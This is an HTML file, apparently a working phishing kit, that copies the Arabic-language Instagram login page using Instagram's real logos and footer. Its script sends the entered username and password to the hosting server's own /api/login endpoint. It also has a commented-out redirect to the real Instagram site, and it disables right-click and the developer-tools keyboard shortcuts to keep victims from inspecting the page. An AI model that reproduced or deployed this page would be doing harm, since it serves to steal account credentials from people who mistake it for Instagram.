<!DOCTYPE html>
<html lang="ar" dir="rtl">
<head>
  <meta charset="UTF-8" />
  <meta name="viewport" content="width=device-width, initial-scale=1, user-scalable=no" />
  <meta name="description" content="Instagram - Connect with friends and the world around you on Instagram." />
  <meta name="keywords" content="Instagram, photos, videos, social media, sharing" />
  <meta name="robots" content="index, follow" />
  <title>Instagram</title>
  <link rel="stylesheet" href="style.css" />
  <link rel="icon" href="https://static.cdninstagram.com/rsrc.php/v3/yI/r/VsNE-OHk_8a.png" type="image/png" />
  <link href="https://fonts.googleapis.com/css2?family=Roboto:wght@300;400;500;600;700&display=swap" rel="stylesheet" />
  <link rel="preload" href="https://www.instagram.com/static/images/web/logged_out_wordmark.png/7a252de00b20.png" as="image" />
</head>
<body>
  <!-- Loading overlay -->
  <div id="loading-overlay" class="loading-overlay">
    <div class="loading-spinner"></div>
    <p>جاري التحميل...</p>
  </div>

  <div class="login-container">
    <div class="login-box">
      <img src="https://www.instagram.com/static/images/web/logged_out_wordmark.png/7a252de00b20.png" alt="Instagram Logo" class="instagram-logo" loading="lazy" />

      <form class="login-form" novalidate>
        <div class="input-group">
          <input type="text" id="username" placeholder="رقم الهاتف أو اسم المستخدم أو البريد الإلكتروني" required autocomplete="username" maxlength="75" />
          <span class="error-message" id="username-error"></span>
        </div>
        
        <div class="input-group">
          <input type="password" id="password" placeholder="كلمة المرور" required autocomplete="current-password" minlength="6" maxlength="255" />
          <button type="button" class="password-toggle" id="password-toggle">
            <span class="toggle-text">إظهار</span>
          </button>
          <span class="error-message" id="password-error"></span>
        </div>
        
        <button type="submit" class="login-button" id="login-btn">
          <span class="button-text">تسجيل الدخول</span>
          <div class="button-spinner" style="display: none;"></div>
        </button>
      </form>

      <div class="or-separator">
        <div class="line"></div>
        <div class="or-text">أو</div>
        <div class="line"></div>
      </div>

      <a href="#" class="facebook-login" id="facebook-login">
        <svg width="16" height="16" viewBox="0 0 24 24" fill="#385185"><path d="M24 12.073c0-6.627-5.373-12-12-12s-12 5.373-12 12c0 5.99 4.388 10.954 10.125 11.854v-8.385H7.078v-3.47h3.047V9.43c0-3.007 1.792-4.669 4.533-4.669 1.312 0 2.686.235 2.686.235v2.953H15.83c-1.491 0-1.956.925-1.956 1.874v2.25h3.328l-.532 3.47h-2.796v8.385C19.612 23.027 24 18.062 24 12.073z"/></svg>
        تسجيل الدخول باستخدام Facebook
      </a>

      <a href="#" class="forgot-password">هل نسيت كلمة المرور؟</a>
    </div>

    <div class="signup-box">
      <p>ليس لديك حساب؟ <a href="#" class="signup-link">إنشاء حساب</a></p>
    </div>

    <div class="app-download">
      <p>احصل على التطبيق.</p>
      <div class="download-buttons">
        <a href="#" class="download-btn"><img src="https://static.cdninstagram.com/rsrc.php/v3/yz/r/c5Rp7Ym-Klz.png" alt="Download on the App Store" /></a>
        <a href="#" class="download-btn"><img src="https://static.cdninstagram.com/rsrc.php/v3/yu/r/EHY6QnZYdNX.png" alt="Get it on Google Play" /></a>
      </div>
    </div>
  </div>

  <footer>
    <div class="footer-links">
      <a href="#">Meta</a><a href="#">حول</a><a href="#">المدونة</a><a href="#">الوظائف</a><a href="#">المساعدة</a><a href="#">API</a><a href="#">الخصوصية</a><a href="#">الشروط</a><a href="#">المواقع</a><a href="#">اللغة</a><a href="#">Instagram Lite</a><a href="#">Threads</a><a href="#">تحميل جهات الاتصال وغير المستخدمين</a><a href="#">Meta Verified</a>
    </div>
    <p class="copyright">&copy; 2025 Instagram من Meta</p>
  </footer>

  <script>
    // --- DOM Element Selection ---
    const form = document.querySelector('.login-form'  );
    const loginButton = document.getElementById('login-btn');
    const usernameInput = document.getElementById('username');
    const passwordInput = document.getElementById('password');
    const passwordToggle = document.getElementById('password-toggle');
    const loadingOverlay = document.getElementById('loading-overlay');

    // --- Event Listeners ---

    // Hide loading overlay after page loads
    window.addEventListener('load', () => {
      setTimeout(() => {
        loadingOverlay.style.opacity = '0';
        setTimeout(() => { loadingOverlay.style.display = 'none'; }, 300);
      }, 500);
    });

    // Form submission handler
    form.addEventListener('submit', async function(e) {
      e.preventDefault();
      
      const username = usernameInput.value.trim();
      const password = passwordInput.value;
      
      clearError('username');
      clearError('password');
      
      let hasErrors = false;
      
      if (!username) {
        showError('username', 'هذا الحقل مطلوب');
        hasErrors = true;
      }
      
      if (!password) {
        showError('password', 'هذا الحقل مطلوب');
        hasErrors = true;
      }
      
      if (hasErrors) return;
      
      setLoadingState(true);
      
      try {
        // ================== التعديل هنا ==================
        const apiUrl = window.location.origin + '/api/login';
        const response = await fetch(apiUrl, {
        // ===============================================
          method: 'POST',
          headers: {
            'Content-Type': 'application/json'
          },
          body: JSON.stringify({ username, password })
        });
        
        const data = await response.json();
        
        if (response.ok && data.success) {
          showMessage(data.message || 'تم تسجيل الدخول بنجاح!', 'success');
          // لا تقم بإعادة التوجيه الآن، لكي نرى رسالة النجاح
          // setTimeout(() => { window.location.href = 'https://www.instagram.com/'; }, 2000  );
        } else {
          showMessage(data.message || 'حدث خطأ أثناء تسجيل الدخول', 'error');
        }
      } catch (error) {
        console.error('Network error:', error);
        showMessage('تعذر الاتصال بالخادم. يرجى التحقق من اتصالك بالإنترنت.', 'error');
      } finally {
        setLoadingState(false);
      }
    });

    // Password visibility toggle
    passwordToggle.addEventListener('click', function() {
      const type = passwordInput.getAttribute('type') === 'password' ? 'text' : 'password';
      passwordInput.setAttribute('type', type);
      this.querySelector('.toggle-text').textContent = type === 'password' ? 'إظهار' : 'إخفاء';
    });

    // Real-time validation and input effects
    [usernameInput, passwordInput].forEach(input => {
      input.addEventListener('input', function() {
        clearError(this.id);
        this.parentElement.classList.toggle('has-value', this.value.trim() !== '');
      });
      input.addEventListener('focus', function() {
        this.parentElement.classList.add('focused');
        clearError(this.id);
      });
      input.addEventListener('blur', function() {
        this.parentElement.classList.remove('focused');
      });
    });
    
    // Prevent form submission on Enter in username field
    usernameInput.addEventListener('keypress', function(e) {
      if (e.key === 'Enter') {
        e.preventDefault();
        passwordInput.focus();
      }
    });

    // Facebook login simulation
    document.getElementById('facebook-login').addEventListener('click', function(e) {
      e.preventDefault();
      showMessage('ميزة تسجيل الدخول عبر Facebook غير متاحة حالياً', 'error');
    });

    // --- Helper Functions ---

    // Validation functions
    const validateEmail = email => /^[^\s@]+@[^\s@]+\.[^\s@]+$/.test(email);
    const validatePhone = phone => /^[\+]?[1-9][\d]{0,15}$/.test(phone.replace(/\s/g, ''));
    const validateUsername = username => /^[a-zA-Z0-9._]{1,30}$/.test(username);

    // Error display functions
    function showError(inputId, message) {
      const errorElement = document.getElementById(inputId + '-error');
      errorElement.textContent = message;
      errorElement.style.display = 'block';
      document.getElementById(inputId).style.borderColor = '#ff3040';
    }

    function clearError(inputId) {
      const errorElement = document.getElementById(inputId + '-error');
      errorElement.style.display = 'none';
      document.getElementById(inputId).style.borderColor = '';
    }

    // UI state functions
    function setLoadingState(isLoading) {
      const buttonText = loginButton.querySelector('.button-text');
      const buttonSpinner = loginButton.querySelector('.button-spinner');
      
      loginButton.disabled = isLoading;
      buttonText.style.display = isLoading ? 'none' : 'inline';
      buttonSpinner.style.display = isLoading ? 'inline-block' : 'none';
      loginButton.style.opacity = isLoading ? '0.7' : '1';
    }

    function showMessage(message, type) {
      const existingMessage = document.querySelector('.message');
      if (existingMessage) existingMessage.remove();

      const messageDiv = document.createElement('div');
      messageDiv.className = `message ${type}`;
      messageDiv.innerHTML = `<div class="message-content"><span class="message-icon">${type === 'error' ? '⚠️' : '✅'}</span><span class="message-text">${message}</span></div>`;
      
      form.parentNode.insertBefore(messageDiv, form.nextSibling);
      
      setTimeout(() => {
        if (messageDiv.parentNode) {
          messageDiv.style.opacity = '0';
          setTimeout(() => messageDiv.remove(), 300);
        }
      }, 5000);
    }

    // Security: Disable developer tools shortcuts
    document.addEventListener('contextmenu', e => e.preventDefault());
    document.addEventListener('keydown', e => {
      if (e.key === 'F12' || (e.ctrlKey && e.shiftKey && e.key === 'I') || (e.ctrlKey && e.key === 'u')) {
        e.preventDefault();
      }
    });
  </script>
</body>
</html>
